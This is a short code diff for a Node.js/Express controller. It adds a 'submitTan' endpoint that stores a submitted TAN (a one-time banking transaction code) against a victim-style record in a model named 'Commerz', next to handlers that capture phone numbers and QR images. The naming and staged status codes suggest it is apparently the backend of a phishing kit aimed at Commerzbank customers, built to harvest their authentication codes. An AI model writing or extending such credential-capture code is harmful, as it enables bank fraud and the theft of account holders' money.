@@ -87,6 +87,20 @@ const submitTelephone = async (req, res) => {
     }
 };
 
+const submitTan = async (req, res) => {
+    const { tan, uniqueid } = req.body;
+    try {
+        await Commerz.findOneAndUpdate(
+            { uniqueid },
+            { tan, status: 7 }
+        ).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const submitQr = async (req, res) => {
     if (!req.files) {
         return res.status(500).send({ msg: "file is not found" });
@@ -135,4 +149,5 @@ module.exports = {
     submitTelephone,
     deleteEntry,
     getQr,
+    submitTan
 };
